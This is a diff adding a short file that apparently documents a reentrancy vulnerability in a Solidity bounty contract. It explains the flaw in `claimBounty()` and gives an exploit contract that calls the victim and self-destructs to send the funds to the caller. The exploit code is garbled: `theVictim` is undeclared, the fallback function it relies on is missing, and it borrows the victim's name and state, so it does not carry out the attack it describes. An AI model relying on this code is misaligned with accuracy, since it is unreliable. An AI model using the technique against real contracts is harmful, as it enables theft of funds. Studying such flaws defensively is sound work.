@@ -1,0 +1,25 @@
+Type of contract: Hackable Contract
+Vulnerability: Reentrancy Exploit
+Cause of vulnerability: The `claimBounty()` function allows the `call.value` to execute before reducing the bounty mapping, enabling reentrancy attacks.
+Working of the vulnerability: An attacker can deploy a contract with a `fallback` function that triggers the `attack()` function, enabling the contract to reenter the `claimBounty()` function and repeatedly withdraw bounties without reducing the bounty mapping or the totalBountyAmount.
+Exploit code example:
+```
+contract BountyHunt {
+
+    mapping(address => uint) public bountyAmount;
+    uint public totalBountyAmount;
+
+    function attack() external payable {
+        if (address(this).balance < 1 ether) {
+            revert("too early");
+        }
+
+        (bool success, ) = theVictim.call(abi.encodeWithSignature("claimBounty()"));
+        require(success, "call failed");
+
+        if (address(this).balance >= 1 ether) {
+            selfdestruct(msg.sender);
+        }
+    }
+}
+```
